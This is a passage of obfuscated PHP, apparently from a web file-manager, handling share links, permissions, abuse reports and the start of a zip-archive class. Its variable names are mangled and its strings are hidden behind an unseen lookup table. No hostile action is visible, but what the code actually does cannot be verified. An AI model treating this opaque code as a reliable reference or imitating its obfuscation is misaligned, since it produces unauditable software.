{ if ($£ú£¹‰² == $öÅ¼Ù¾³[1347]) { $¿×—ò£æ = array($öÅ¼Ù¾³[685] => 1); } } $¿×—ò£æ[$öÅ¼Ù¾³[1592]] = USER_ID; $Í†ÇÕõØ = $this->where($¿×—ò£æ)->selectPage($ÌÀåßÙğ); return $Í†ÇÕõØ; } protected function listToMe($…«’ƒÔ– = 300) { $¨æ×ˆÅí =& $_SERVER[©—Ò»ÅĞ]; $˜Âµ§ø£ = Model($¨æ×ˆÅí[2331])->userGroupParents(USER_ID); $’Â–‹©Ù = array($¨æ×ˆÅí[670] => SourceModel::TYPE_USER, $¨æ×ˆÅí[589] => USER_ID); if ($˜Âµ§ø£) { $’Â–‹©Ù = array(array($¨æ×ˆÅí[670] => SourceModel::TYPE_USER, $¨æ×ˆÅí[589] => USER_ID), array($¨æ×ˆÅí[670] => SourceModel::TYPE_GROUP, $¨æ×ˆÅí[589] => array($¨æ×ˆÅí[7], $˜Âµ§ø£)), $¨æ×ˆÅí[2329] => $¨æ×ˆÅí[2285]); } $‹çÇûÅñ = Model($¨æ×ˆÅí[688])->field($¨æ×ˆÅí[687])->where($’Â–‹©Ù)->select(); $‹çÇûÅñ = array_unique(array_to_keyvalue($‹çÇûÅñ, $¨æ×ˆÅí[12], $¨æ×ˆÅí[687])); $’Â–‹©Ù = array($¨æ×ˆÅí[687] => array($¨æ×ˆÅí[507], $‹çÇûÅñ)); if (!$‹çÇûÅñ) { return array($¨æ×ˆÅí[446] => array(), $¨æ×ˆÅí[443] => array($¨æ×ˆÅí[2332] => 0, $¨æ×ˆÅí[428] => 1)); } $ªÓ’íÅÄ = Model($¨æ×ˆÅí[688])->where($’Â–‹©Ù)->select(); $ªÓ’íÅÄ = array_to_keyvalue_group($ªÓ’íÅÄ, $¨æ×ˆÅí[687]); $éÃÉì = $¨æ×ˆÅí[2333]; $Í—è×ÄŞ = $this->field($éÃÉì)->where($’Â–‹©Ù)->selectPage($…«’ƒÔ–); foreach ($Í—è×ÄŞ[$¨æ×ˆÅí[446]] as $ãÛ½°Ü => &$øØÕÃ¨Ï) { $øØÕÃ¨Ï[$¨æ×ˆÅí[1550]] = $ªÓ’íÅÄ[$øØÕÃ¨Ï[$¨æ×ˆÅí[687]]]; } unset($øØÕÃ¨Ï); return $Í—è×ÄŞ; } protected function shareAdd($Ç¸ô‹¡¶, $Šİ¨ä¥Î) { $øèõÇÔ¸ =& $_SERVER[©—Ò»ÅĞ]; $ğİ‡¼ª¨ = $this->_addShareData($Ç¸ô‹¡¶, $Šİ¨ä¥Î); if (!empty($Šİ¨ä¥Î[$øèõÇÔ¸[2334]])) { $this->_shareAuthSet($ğİ‡¼ª¨, $Šİ¨ä¥Î[$øèõÇÔ¸[2334]]); } $this->shareEventAdd($Ç¸ô‹¡¶, $Šİ¨ä¥Î, $øèõÇÔ¸[2335]); return $ğİ‡¼ª¨; } protected function shareAddSystem($¢’îÊ±, $öô—é™ø) { $ÎáËÙªı =& $_SERVER[©—Ò»ÅĞ]; $Ù®Ÿ¤ÃÑ = $this->_addShareData($¢’îÊ±, $öô—é™ø, $ÎáËÙªı[189]); $this->_shareAuthSet($Ù®Ÿ¤ÃÑ, $öô—é™ø[$ÎáËÙªı[2334]]); return $Ù®Ÿ¤ÃÑ; } private function shareEventAdd($±œÖü“½, $Äò’Í‘ì, $¤Ö›Èßš = "\141\144\144") { $¼Å©áŸ› =& $_SERVER[©—Ò»ÅĞ]; if (!$±œÖü“½ || $±œÖü“½ == $¼Å©áŸ›[228]) { return; } if ($¤Ö›Èßš == $¼Å©áŸ›[2335]) { if ($Äò’Í‘ì[$¼Å©áŸ›[578]] == $¼Å©áŸ›[91]) { Model($¼Å©áŸ›[655])->eventShare($±œÖü“½, $¼Å©áŸ›[2336]); } if ($Äò’Í‘ì[$¼Å©áŸ›[685]] == $¼Å©áŸ›[91]) { Model($¼Å©áŸ›[655])->eventShare($±œÖü“½, $¼Å©áŸ›[2337]); } return; } $ŞøªÓöÎ = $this->getInfoByPath($±œÖü“½); $¶û©Õ‚ = $¼Å©áŸ›[2338]; if ($ŞøªÓöÎ[$¼Å©áŸ›[578]] == $¼Å©áŸ›[228] && $Äò’Í‘ì[$¼Å©áŸ›[578]] == $¼Å©áŸ›[91]) { $¶û©Õ‚ = $¼Å©áŸ›[2336]; } if ($ŞøªÓöÎ[$¼Å©áŸ›[578]] == $¼Å©áŸ›[91] && $Äò’Í‘ì[$¼Å©áŸ›[578]] == $¼Å©áŸ›[228]) { $¶û©Õ‚ = $¼Å©áŸ›[2339]; } if ($ŞøªÓöÎ[$¼Å©áŸ›[685]] == $¼Å©áŸ›[228] && $Äò’Í‘ì[$¼Å©áŸ›[685]] == $¼Å©áŸ›[91]) { $¶û©Õ‚ = $¼Å©áŸ›[2337]; } if ($ŞøªÓöÎ[$¼Å©áŸ›[685]] == $¼Å©áŸ›[91] && $Äò’Í‘ì[$¼Å©áŸ›[685]] == $¼Å©áŸ›[228]) { $¶û©Õ‚ = $¼Å©áŸ›[2340]; } Model($¼Å©áŸ›[655])->eventShare($±œÖü“½, $¶û©Õ‚); return; } private function _addShareData($Çí‘©ÚÉ, $âøÉÔÑÕ = array(), $£ñÕôÒÔ = false) { $›Å€Û¼Œ =& $_SERVER[©—Ò»ÅĞ]; $«ºÃ´È = $£ñÕôÒÔ == $›Å€Û¼Œ[189] ? 0 : USER_ID; $§×ª©¼¦ = array($›Å€Û¼Œ[506] => $Çí‘©ÚÉ, $›Å€Û¼Œ[1969] => $«ºÃ´È); if ($Çí‘©ÚÉ == 0) { $§×ª©¼¦ = array($›Å€Û¼Œ[2341] => $âøÉÔÑÕ[$›Å€Û¼Œ[583]], $›Å€Û¼Œ[1969] => $«ºÃ´È); } if ($ğœËİœ· = $this->where($§×ª©¼¦)->find()) { return $ğœËİœ·[$›Å€Û¼Œ[687]]; } if ($Çí‘©ÚÉ == 0) { $ßúÑæ¸ò = array($›Å€Û¼Œ[32] => get_path_this($âøÉÔÑÕ[$›Å€Û¼Œ[87]])); } else { $ßúÑæ¸ò = Model($›Å€Û¼Œ[933])->sourceInfo($Çí‘©ÚÉ); if (!$ßúÑæ¸ò) { return !1; } } if (!$âøÉÔÑÕ[$›Å€Û¼Œ[1865]]) { $âøÉÔÑÕ[$›Å€Û¼Œ[1865]] = $ßúÑæ¸ò[$›Å€Û¼Œ[32]]; } $¹ÎÆ¢£ = array($›Å€Û¼Œ[1969] => $«ºÃ´È, $›Å€Û¼Œ[506] => $Çí‘©ÚÉ, $›Å€Û¼Œ[1865] => $›Å€Û¼Œ[12], $›Å€Û¼Œ[578] => 0, $›Å€Û¼Œ[685] => 0, $›Å€Û¼Œ[583] => $›Å€Û¼Œ[12], $›Å€Û¼Œ[382] => $›Å€Û¼Œ[12], $›Å€Û¼Œ[1050] => $›Å€Û¼Œ[12], $›Å€Û¼Œ[2342] => 0, $›Å€Û¼Œ[2343] => 0, $›Å€Û¼Œ[862] => 0, $›Å€Û¼Œ[580] => $›Å€Û¼Œ[12], $›Å€Û¼Œ[1554] => $›Å€Û¼Œ[12]); $£Ò¹õı = explode($›Å€Û¼Œ[50], $›Å€Û¼Œ[2344]); foreach ($£Ò¹õı as $úÃ—±ú³) { if (!isset($âøÉÔÑÕ[$úÃ—±ú³])) { continue; } $¹ÎÆ¢£[$úÃ—±ú³] = $âøÉÔÑÕ[$úÃ—±ú³]; } $Ç„×—© = $this->add($¹ÎÆ¢£); $½´½’õ× = array($›Å€Û¼Œ[1554] => short_id($Ç„×—©)); if ($this->where($½´½’õ×)->find()) { $½´½’õ×[$›Å€Û¼Œ[1554]] .= $›Å€Û¼Œ[476] . rand_string(2, 3); } $this->where(array($›Å€Û¼Œ[2345] => $Ç„×—©))->save($½´½’õ×); return $Ç„×—©; } private function _shareAuthSet($³Ãæéøë, $¥™ÏÃ–¡) { $ã¡ß…µŞ =& $_SERVER[©—Ò»ÅĞ]; if (!is_array($¥™ÏÃ–¡)) { return !1; } $ óÜä•å = Model($ã¡ß…µŞ[2294]); $ óÜä•å->where(array($ã¡ß…µŞ[687] => $³Ãæéøë))->delete(); $’Í£Ÿ¸˜ = array(); foreach ($¥™ÏÃ–¡ as $ç»ÂÂğŞ) { $ØÓ½Õ½ = SourceModel::TYPE_USER; if ($ç»ÂÂğŞ[$ã¡ß…µŞ[188]] == SourceModel::TYPE_GROUP) { $ØÓ½Õ½ = SourceModel::TYPE_GROUP; } $’¡€Œ™¢ = array($ã¡ß…µŞ[687] => $³Ãæéøë, $ã¡ß…µŞ[188] => $ØÓ½Õ½, $ã¡ß…µŞ[589] => intval($ç»ÂÂğŞ[$ã¡ß…µŞ[589]]), $ã¡ß…µŞ[1640] => 0, $ã¡ß…µŞ[2346] => -1); if ($ç»ÂÂğŞ[$ã¡ß…µŞ[1640]]) { $’¡€Œ™¢[$ã¡ß…µŞ[1640]] = $ç»ÂÂğŞ[$ã¡ß…µŞ[1640]]; } else { if ($ç»ÂÂğŞ[$ã¡ß…µŞ[2346]]) { $’¡€Œ™¢[$ã¡ß…µŞ[2346]] = $ç»ÂÂğŞ[$ã¡ß…µŞ[2346]]; } } $’Í£Ÿ¸˜[] = $’¡€Œ™¢; } return $ óÜä•å->addAll($’Í£Ÿ¸˜, array(), !0); } public function numViewAdd($éœèË”) { $ÖóÅ’‡é =& $_SERVER[©—Ò»ÅĞ]; $Ê·öç“ = array($ÖóÅ’‡é[2345] => $éœèË”); $this->where($Ê·öç“)->setAdd($ÖóÅ’‡é[2342]); } public function numDownloadAdd($ãåó ´ ) { $õ·Ÿ½æ =& $_SERVER[©—Ò»ÅĞ]; $ıŠ¦¢“¶ = array($õ·Ÿ½æ[2345] => $ãåó ´ ); $this->where($ıŠ¦¢“¶)->setAdd($õ·Ÿ½æ[2343]); } protected function shareEdit($ë“Ã“¢, $¸°şÃôö) { $¡á’¯  =& $_SERVER[©—Ò»ÅĞ]; $½ÔÉ·Â¯ = $this->getInfo($ë“Ã“¢); if (!$½ÔÉ·Â¯) { return !1; } if ($¸°şÃôö[$¡á’¯ [1554]] && $¸°şÃôö[$¡á’¯ [578]] == $¡á’¯ [91]) { if ($¸°şÃôö[$¡á’¯ [1554]] == $½ÔÉ·Â¯[$¡á’¯ [1554]]) { unset($¸°şÃôö[$¡á’¯ [1554]]); } if ($¸°şÃôö[$¡á’¯ [1554]]) { $µŠ¦è³Õ = $this->where(array($¡á’¯ [2347] => $¸°şÃôö[$¡á’¯ [1554]]))->find(); if ($µŠ¦è³Õ) { return !1; } if (!is_array($¸°şÃôö[$¡á’¯ [580]])) { $¸°şÃôö[$¡á’¯ [580]] = is_array($½ÔÉ·Â¯[$¡á’¯ [580]]) ? $½ÔÉ·Â¯[$¡á’¯ [580]] : array(); } if (!$¸°şÃôö[$¡á’¯ [580]][$¡á’¯ [2348]]) { $¸°şÃôö[$¡á’¯ [580]][$¡á’¯ [2348]] = $½ÔÉ·Â¯[$¡á’¯ [1554]]; $¸°şÃôö[$¡á’¯ [580]][$¡á’¯ [2349]] = $¡á’¯ [91]; } } } $this->_checkLinkShare($¸°şÃôö, $½ÔÉ·Â¯); $´ïÍ¼¶Í = array(); $é–×Ø¡„ = explode($¡á’¯ [50], $¡á’¯ [2350]); foreach ($é–×Ø¡„ as $îÒ›³ˆ‘) { if (!array_key_exists($îÒ›³ˆ‘, $¸°şÃôö)) { continue; } $´ïÍ¼¶Í[$îÒ›³ˆ‘] = $¸°şÃôö[$îÒ›³ˆ‘]; } $this->shareEventAdd($½ÔÉ·Â¯[$¡á’¯ [191]], $¸°şÃôö, $¡á’¯ [1561]); $this->where(array($¡á’¯ [2345] => $ë“Ã“¢))->save($´ïÍ¼¶Í); if (isset($¸°şÃôö[$¡á’¯ [2334]])) { $this->_shareAuthSet($ë“Ã“¢, $¸°şÃôö[$¡á’¯ [2334]]); } return !0; } private function _checkLinkShare($»ğçŸ©È, $æ›Ö—â) { $ßñš¸…× =& $_SERVER[©—Ò»ÅĞ]; if ($»ğçŸ©È[$ßñš¸…×[578]] != $ßñš¸…×[91]) { return; } $ÌÕ¸Ñ× = $æ›Ö—â[$ßñš¸…×[90]][$ßñš¸…×[191]]; if ($æ›Ö—â[$ßñš¸…×[90]][$ßñš¸…×[33]] != $ßñš¸…×[230]) { $š²Š«…ğ = $this->_folderReport($ÌÕ¸Ñ×); if (!$š²Š«…ğ) { return; } show_json(LNG($ßñš¸…×[2351]) . $ßñš¸…×[2352] . $š²Š«…ğ, !1); } $Ä¸›Èíò = Model($ßñš¸…×[933])->fileInfoGet($æ›Ö—â[$ßñš¸…×[90]][$ßñš¸…×[191]]); if (!$Ä¸›Èíò) { return; } $¼¦Ÿˆá = $this->shareFileMeta($Ä¸›Èíò[$ßñš¸…×[557]]); if (isset($¼¦Ÿˆá[$ßñš¸…×[451]]) && $¼¦Ÿˆá[$ßñš¸…×[451]] == $ßñš¸…×[91]) { show_json(LNG($ßñš¸…×[2353]), !1); } } private function _folderReport($ËÊÑæË–) { $‘Éª©˜” =& $_SERVER[©—Ò»ÅĞ]; $÷“»ª‚õ = array($‘Éª©˜”[557] => array($‘Éª©˜”[1180], 0), $‘Éª©˜”[850] => 3); $Œ“Ä™ü = Model($‘Éª©˜”[2354])->where($÷“»ª‚õ)->field($‘Éª©˜”[557])->select(); if (!$Œ“Ä™ü) { return !1; } $Œ“Ä™ü = array_to_keyvalue($Œ“Ä™ü, $‘Éª©˜”[12], $‘Éª©˜”[557]); $¾¹†¿ã£ = $‘Éª©˜”[50] . $ËÊÑæË– . $‘Éª©˜”[50]; $÷“»ª‚õ = array($‘Éª©˜”[557] => array($‘Éª©˜”[7], $Œ“Ä™ü), $‘Éª©˜”[604] => array($‘Éª©˜”[473], "\x25{$¾¹†¿ã£}\x25"), $‘Éª©˜”[520] => 0); $ç¿‰æ¬º = Model($‘Éª©˜”[933])->where($÷“»ª‚õ)->field($‘Éª©˜”[2355])->find(); if (!$ç¿‰æ¬º) { return !1; } $…Ğ½æ²” = substr($ç¿‰æ¬º[$‘Éª©˜”[604]], strpos($ç¿‰æ¬º[$‘Éª©˜”[604]], $¾¹†¿ã£)); $÷“»ª‚õ = array($‘Éª©˜”[191] => array($‘Éª©˜”[7], trim($…Ğ½æ²”, $‘Éª©˜”[50]))); $ìÈğ‘¡ = Model($‘Éª©˜”[933])->where($÷“»ª‚õ)->field($‘Éª©˜”[32])->select(); $ï—‘Š‘ê = array_to_keyvalue($ìÈğ‘¡, $‘Éª©˜”[12], $‘Éª©˜”[32]); $ï—‘Š‘ê[] = $ç¿‰æ¬º[$‘Éª©˜”[32]]; return implode($‘Éª©˜”[8], $ï—‘Š‘ê); } protected function remove($Ü”ÄÔìù) { $Å×“ç¹ë =& $_SERVER[©—Ò»ÅĞ]; $ çŸäØ• = is_array($Ü”ÄÔìù) ? $Ü”ÄÔìù : array($Ü”ÄÔìù); for ($ÊÍ¨÷— = 0; $ÊÍ¨÷— < count($ çŸäØ•); $ÊÍ¨÷—++) { $·£ –€­ = $this->getInfo($ çŸäØ•[$ÊÍ¨÷—]); if ($·£ –€­[$Å×“ç¹ë[685]] == $Å×“ç¹ë[91]) { Model($Å×“ç¹ë[655])->eventShare($·£ –€­[$Å×“ç¹ë[191]], $Å×“ç¹ë[2340]); } if ($·£ –€­[$Å×“ç¹ë[578]] == $Å×“ç¹ë[91]) { Model($Å×“ç¹ë[655])->eventShare($·£ –€­[$Å×“ç¹ë[191]], $Å×“ç¹ë[2339]); } } $ÄÑ›Ü— = array($Å×“ç¹ë[687] => array($Å×“ç¹ë[7], $ çŸäØ•)); $››’Æ®Ÿ = $this->where($ÄÑ›Ü—)->delete(); if ($››’Æ®Ÿ) { Model($Å×“ç¹ë[688])->where($ÄÑ›Ü—)->delete(); } return $››’Æ®Ÿ; } protected function removeBySource($Ÿ…ìØŸŸ) { $Êó¯˜ğÊ =& $_SERVER[©—Ò»ÅĞ]; $ÈÄÒ»Â = array($Êó¯˜ğÊ[506] => array($Êó¯˜ğÊ[507], $Ÿ…ìØŸŸ)); $ìñ”ì±° = $this->field($Êó¯˜ğÊ[687])->where($ÈÄÒ»Â)->select(); $ğ¯­úà = array_to_keyvalue($ìñ”ì±°, $Êó¯˜ğÊ[12], $Êó¯˜ğÊ[687]); if (!$ğ¯­úà) { return; } foreach ($ìñ”ì±° as $»³ì¯ùÕ) { $this->cacheFunctionClear($Êó¯˜ğÊ[2356], $»³ì¯ùÕ[$Êó¯˜ğÊ[687]]); } $ÈÄÒ»Â = array($Êó¯˜ğÊ[2345] => array($Êó¯˜ğÊ[507], $ğ¯­úà)); $this->where($ÈÄÒ»Â)->delete(); Model($Êó¯˜ğÊ[688])->where($ÈÄÒ»Â)->delete(); } public function listAll($ğ¡£âµ) { $´À¬ş¦ =& $_SERVER[©—Ò»ÅĞ]; $İÃá‹ª± = array(); if ($ğ¡£âµ[$´À¬ş¦[1592]]) { $İÃá‹ª±[$´À¬ş¦[1592]] = $ğ¡£âµ[$´À¬ş¦[1592]]; } if ($ğ¡£âµ[$´À¬ş¦[861]]) { $ƒÇÙğ± = $ğ¡£âµ[$´À¬ş¦[862]] ? $ğ¡£âµ[$´À¬ş¦[862]] : strtotime(date($´À¬ş¦[2357])); $İÃá‹ª±[$´À¬ş¦[231]] = array($´À¬ş¦[408], array($ğ¡£âµ[$´À¬ş¦[861]], $ƒÇÙğ±)); } if ($ğ¡£âµ[$´À¬ş¦[33]]) { $İÃá‹ª±[$ğ¡£âµ[$´À¬ş¦[33]]] = 1; } else { $İÃá‹ª±[] = array($´À¬ş¦[578] => array($´À¬ş¦[1180], 0), $´À¬ş¦[685] => array($´À¬ş¦[1180], 0), $´À¬ş¦[2329] => $´À¬ş¦[2285]); } if ($ğ¡£âµ[$´À¬ş¦[2281]]) { $İÃá‹ª±[] = array($´À¬ş¦[1554] => $ğ¡£âµ[$´À¬ş¦[2281]], $´À¬ş¦[1865] => array($´À¬ş¦[473], "\x25{$ğ¡£âµ[$´À¬ş¦[2281]]}\x25"), $´À¬ş¦[2329] => $´À¬ş¦[2285]); } $´ ˆ±„Ï = $this->_makeOrder()->where($İÃá‹ª±)->selectPage(20); if (empty($´ ˆ±„Ï[$´À¬ş¦[446]])) { return array(); } $this->_listDataApply($´ ˆ±„Ï[$´À¬ş¦[446]]); return $´ ˆ±„Ï; } public function listDataApply($ıâÆó€¼) { $this->_listDataApply($ıâÆó€¼); return $ıâÆó€¼; } private function _listDataApply(&$Ò¶ş”Ã›) { $À£“ğ¨¿ =& $_SERVER[©—Ò»ÅĞ]; $ôñ­À—‚ = array_to_keyvalue($Ò¶ş”Ã›, $À£“ğ¨¿[12], $À£“ğ¨¿[1592]); $§¡ı±… = Model($À£“ğ¨¿[617])->userListInfo(array_unique($ôñ­À—‚)); $“ı˜‘ŒÔ = array_to_keyvalue($Ò¶ş”Ã›, $À£“ğ¨¿[12], $À£“ğ¨¿[191]); $‡¬¬ö§Ô = Model($À£“ğ¨¿[933])->sourceListInfo($“ı˜‘ŒÔ, !0); foreach ($Ò¶ş”Ã› as $úæ®Í => &$£ãÀñ) { $¬’š€‘Ë = $£ãÀñ[$À£“ğ¨¿[1592]]; $£ãÀñ[$À£“ğ¨¿[2358]] = $§¡ı±…[$¬’š€‘Ë] ? $§¡ı±…[$¬’š€‘Ë] : !1; if (!$£ãÀñ[$À£“ğ¨¿[2358]] || $£ãÀñ[$À£“ğ¨¿[2358]][$À£“ğ¨¿[850]] != $À£“ğ¨¿[91]) { unset($Ò¶ş”Ã›[$úæ®Í]); continue; } $œÜÂ€íº = $£ãÀñ[$À£“ğ¨¿[191]]; $£ãÀñ[$À£“ğ¨¿[90]] = $‡¬¬ö§Ô[$œÜÂ€íº] ? $‡¬¬ö§Ô[$œÜÂ€íº] : !1; if ($£ãÀñ[$À£“ğ¨¿[90]][$À£“ğ¨¿[520]] == $À£“ğ¨¿[91]) { unset($Ò¶ş”Ã›[$úæ®Í]); } if ($£ãÀñ[$À£“ğ¨¿[90]] != $À£“ğ¨¿[228] && !$£ãÀñ[$À£“ğ¨¿[90]]) { unset($Ò¶ş”Ã›[$úæ®Í]); } } unset($£ãÀñ); $Ò¶ş”Ã› = array_values($Ò¶ş”Ã›); } private function _makeOrder($¸í˜ƒƒø = '') { $ÈÛ’Á‹† =& $_SERVER[©—Ò»ÅĞ]; $œõÉ÷²ğ = array($ÈÛ’Á‹†[231], $ÈÛ’Á‹†[862], $ÈÛ’Á‹†[2342], $ÈÛ’Á‹†[2343]); $Ú¡êÛš… = array($ÈÛ’Á‹†[537] => $ÈÛ’Á‹†[538], $ÈÛ’Á‹†[539] => $ÈÛ’Á‹†[540]); $ÈÍÇöºø = Input::get($ÈÛ’Á‹†[544], $ÈÛ’Á‹†[7], $ÈÛ’Á‹†[512], $œõÉ÷²ğ); $‰‚§Ìõ˜ = Input::get($ÈÛ’Á‹†[545], $ÈÛ’Á‹†[7], $ÈÛ’Á‹†[2359], array($ÈÛ’Á‹†[2278], $ÈÛ’Á‹†[539])); $‰‚§Ìõ˜ = $Ú¡êÛš…[$‰‚§Ìõ˜]; $¸í˜ƒƒø = $¸í˜ƒƒø . "{$ÈÍÇöºø}\x20{$‰‚§Ìõ˜}"; return $this->order($¸í˜ƒƒø); } public function reportAdd($ÛÎÁĞÄ) { $×ú‰ˆ•÷ =& $_SERVER[©—Ò»ÅĞ]; $¡ıùùÜË = array($×ú‰ˆ•÷[687] => $ÛÎÁĞÄ[$×ú‰ˆ•÷[687]], $×ú‰ˆ•÷[1592] => USER_ID); if (Model($×ú‰ˆ•÷[2354])->where($¡ıùùÜË)->find()) { return !1; } $Îè¦¡ğ = array($×ú‰ˆ•÷[687] => $ÛÎÁĞÄ[$×ú‰ˆ•÷[687]], $×ú‰ˆ•÷[1865] => $ÛÎÁĞÄ[$×ú‰ˆ•÷[1865]], $×ú‰ˆ•÷[191] => $ÛÎÁĞÄ[$×ú‰ˆ•÷[191]], $×ú‰ˆ•÷[557] => $ÛÎÁĞÄ[$×ú‰ˆ•÷[557]], $×ú‰ˆ•÷[1592] => USER_ID, $×ú‰ˆ•÷[33] => $ÛÎÁĞÄ[$×ú‰ˆ•÷[33]], $×ú‰ˆ•÷[540] => $ÛÎÁĞÄ[$×ú‰ˆ•÷[540]]); return Model($×ú‰ˆ•÷[2354])->add($Îè¦¡ğ); } public function reportList($íŠêÔ) { $‹Ç¹’ì½ =& $_SERVER[©—Ò»ÅĞ]; $ê¢‚Âù = array(); if ($íŠêÔ[$‹Ç¹’ì½[861]]) { $øäÏ£ò× = $íŠêÔ[$‹Ç¹’ì½[862]] ? $íŠêÔ[$‹Ç¹’ì½[862]] : strtotime(date($‹Ç¹’ì½[2357])); $ê¢‚Âù[$‹Ç¹’ì½[231]] = array($‹Ç¹’ì½[408], array($íŠêÔ[$‹Ç¹’ì½[861]], $øäÏ£ò×)); } if (isset($íŠêÔ[$‹Ç¹’ì½[33]]) && in_array($íŠêÔ[$‹Ç¹’ì½[33]], array($‹Ç¹’ì½[91], $‹Ç¹’ì½[524], $‹Ç¹’ì½[2360], $‹Ç¹’ì½[2361], $‹Ç¹’ì½[2362]))) { $ê¢‚Âù[$‹Ç¹’ì½[33]] = $íŠêÔ[$‹Ç¹’ì½[33]]; } if (isset($íŠêÔ[$‹Ç¹’ì½[850]]) && in_array($íŠêÔ[$‹Ç¹’ì½[850]], array($‹Ç¹’ì½[228], $‹Ç¹’ì½[91], $‹Ç¹’ì½[524], $‹Ç¹’ì½[2360]))) { $ê¢‚Âù[$‹Ç¹’ì½[850]] = $íŠêÔ[$‹Ç¹’ì½[850]]; } $ÇÓ¡Úıå = Input::get($‹Ç¹’ì½[545], $‹Ç¹’ì½[7], $‹Ç¹’ì½[2359], array($‹Ç¹’ì½[2278], $‹Ç¹’ì½[539])); $µĞ˜œ¡ = array($‹Ç¹’ì½[537] => $‹Ç¹’ì½[538], $‹Ç¹’ì½[539] => $‹Ç¹’ì½[540]); $œåû©ß¹ = $‹Ç¹’ì½[2363] . $µĞ˜œ¡[$ÇÓ¡Úıå]; $©Á‚òÜù = Model($‹Ç¹’ì½[2354])->where($ê¢‚Âù)->order($œåû©ß¹)->selectPage(20); if (empty($©Á‚òÜù[$‹Ç¹’ì½[446]])) { return array(); } $«¢‘£ô = array_to_keyvalue_group($©Á‚òÜù[$‹Ç¹’ì½[446]], $‹Ç¹’ì½[850], $‹Ç¹’ì½[687]); if (!empty($«¢‘£ô[0])) { $íŠêÔ = $«¢‘£ô[0]; $ê¢‚Âù = array($‹Ç¹’ì½[687] => array($‹Ç¹’ì½[7], $íŠêÔ)); $Ğ·¼‰åë = $this->where($ê¢‚Âù)->field($‹Ç¹’ì½[687])->select(); $Ğ·¼‰åë = array_to_keyvalue($Ğ·¼‰åë, $‹Ç¹’ì½[12], $‹Ç¹’ì½[687]); $ï¢Ìëºé = array_diff($íŠêÔ, $Ğ·¼‰åë); if (!empty($ï¢Ìëºé)) { foreach ($©Á‚òÜù[$‹Ç¹’ì½[446]] as $³’Ïû“ã => $¯ƒ ›Œ) { if (in_array($¯ƒ ›Œ[$‹Ç¹’ì½[687]], $ï¢Ìëºé)) { unset($©Á‚òÜù[$‹Ç¹’ì½[446]][$³’Ïû“ã]); } } } } $this->_listDataApply($©Á‚òÜù[$‹Ç¹’ì½[446]]); return $©Á‚òÜù; } public function reportStatus($®ñÄ‚õõ) { $ÊÃå„òø =& $_SERVER[©—Ò»ÅĞ]; $Å¼±Ä™¦ = array($ÊÃå„òø[487] => $®ñÄ‚õõ[$ÊÃå„òø[487]]); $Óï«ˆ¯ = Model($ÊÃå„òø[2354])->where($Å¼±Ä™¦)->field($ÊÃå„òø[2364])->find(); if (!$Óï«ˆ¯) { return !1; } $«—Ä‘çì = array($ÊÃå„òø[850] => $®ñÄ‚õõ[$ÊÃå„òø[850]]); if ($®ñÄ‚õõ[$ÊÃå„òø[850]] == $ÊÃå„òø[2360] && $Óï«ˆ¯[$ÊÃå„òø[850]] == $ÊÃå„òø[2360]) { $«—Ä‘çì[$ÊÃå„òø[850]] = 0; } $¼Á¼¶…½ = Model($ÊÃå„òø[2354])->where($Å¼±Ä™¦)->save($«—Ä‘çì); if ($®ñÄ‚õõ[$ÊÃå„òø[850]] == $ÊÃå„òø[524]) { if ($Óï«ˆ¯[$ÊÃå„òø[557]] != $ÊÃå„òø[228] && $this->shareFileMeta($Óï«ˆ¯[$ÊÃå„òø[557]])) { $this->shareFileMeta($Óï«ˆ¯[$ÊÃå„òø[557]], 0); } $this->remove($Óï«ˆ¯[$ÊÃå„òø[687]]); return !0; } if ($¼Á¼¶…½ && $®ñÄ‚õõ[$ÊÃå„òø[850]] == $ÊÃå„òø[2360]) { $“šŒÔÁÙ = $«—Ä‘çì[$ÊÃå„òø[850]] == $ÊÃå„òø[2360] ? 1 : 0; $this->shareFileMeta($Óï«ˆ¯[$ÊÃå„òø[557]], $“šŒÔÁÙ); $this->removeByFile($Óï«ˆ¯[$ÊÃå„òø[557]]); } return $¼Á¼¶…½; } private function removeByFile($Áéâ¦™ª) { $ƒ¹úÍŒ =& $_SERVER[©—Ò»ÅĞ]; $‰ÃÛØßœ = Model($ƒ¹úÍŒ[933])->where(array($ƒ¹úÍŒ[557] => $Áéâ¦™ª))->field($ƒ¹úÍŒ[191])->select(); $¼ÙÃÆùî = array_to_keyvalue($‰ÃÛØßœ, $ƒ¹úÍŒ[12], $ƒ¹úÍŒ[191]); $‹ÒÆÀ÷’ = array($ƒ¹úÍŒ[191] => array($ƒ¹úÍŒ[7], $¼ÙÃÆùî), $ƒ¹úÍŒ[578] => 1); $‰ÃÛØßœ = $this->where($‹ÒÆÀ÷’)->field($ƒ¹úÍŒ[687])->select(); if (empty($‰ÃÛØßœ)) { return; } $ôËé¯¿Ï = array_to_keyvalue($‰ÃÛØßœ, $ƒ¹úÍŒ[12], $ƒ¹úÍŒ[687]); $this->remove($ôËé¯¿Ï); } private function shareFileMeta($úíÎÖœû, $ø‚•“¶½ = null) { $ÄöÌÏî =& $_SERVER[©—Ò»ÅĞ]; $ê…ÒïÃµ = array($ÄöÌÏî[557] => $úíÎÖœû, $ÄöÌÏî[95] => $ÄöÌÏî[2365]); if (is_null($ø‚•“¶½)) { return Model($ÄöÌÏî[2366])->where($ê…ÒïÃµ)->find(); } $ê…ÒïÃµ[$ÄöÌÏî[451]] = $ø‚•“¶½; Model($ÄöÌÏî[2366])->add($ê…ÒïÃµ, array(), !0); } } goto C—¶èë•›²; Fáœ†ËçÎ: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ƒ†»¢¤¡; if ($ƒ†»¢¤¡) { return $ƒ†»¢¤¡; } $Ê®Á™œÙ = IO::init($_SERVER[©—Ò»ÅĞ][8]); return $Ê®Á™œÙ; } private static function iconvSystem($é§“ƒü‡) { return self::local()->iconvSystem($é§“ƒü‡); } private static function iconvApp($ÖÔ¤·³) { return self::local()->iconvApp($ÖÔ¤·³); } public static function zipFolder($•–Å†Æ, $ŠÒÂÑ±Œ = "\172\x69\160", $ó×ĞÛã = '', $ğ‘ùèÔ’ = REPEAT_RENAME) { $„ğÂåœŸ =& $_SERVER[©—Ò»ÅĞ]; $”” Ûüí = IO::listPath($•–Å†Æ); if (!$”” Ûüí) { return !1; } $”” Ûüí = array_merge($”” Ûüí[$„ğÂåœŸ[85]], $”” Ûüí[$„ğÂåœŸ[86]]); return self::zip($”” Ûüí, $ŠÒÂÑ±Œ, $ó×ĞÛã, $ğ‘ùèÔ’); } public static function zip($é»ÜÚÆ, $•ß®êÙ„ = "\x7a\x69\160", $°‡­µ„ = '', $»á¶ÛŸæ = REPEAT_RENAME) { $Ú‹«””ë =& $_SERVER[©—Ò»ÅĞ]; if 